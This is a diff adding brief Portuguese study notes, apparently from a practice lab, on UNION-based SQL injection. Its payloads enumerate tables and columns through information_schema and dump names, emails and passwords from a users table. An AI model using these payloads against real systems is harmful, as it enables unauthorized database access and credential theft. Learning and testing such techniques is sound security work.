@@ -1,0 +1,21 @@
+Information Schema
+
+BD somente leitura que fornece acesso os metadados do servidor
+
+código de injeção no campo de busca:
+
+' => Fecha o código do programador
+UNION => Faz a união das tabelas, código sql malicioso.
+-- => comenta o restante do código (necessita um espaço a mais )
+
+' UNION (SELECT TABLE_NAME,TABLE_SCHEMA,TABLE_ROWS FROM information_schema . `TABLES`)-- 
+
+
+Escolhendo uma tabela com condição para verificar suas colunas
+
+' UNION (SELECT COLUMN_NAME,2,3 from information_schema . `columns` where TABLE_NAME = 'users' AND TABLE_SCHEMA = 'injections')-- 
+
+
+Com todas as informações necessárias sobre os bancos de dados, tabelas e colunas... sql recuperando os dados da tabela users:
+
+' UNION (SELECT name, email, password FROM users)-- 
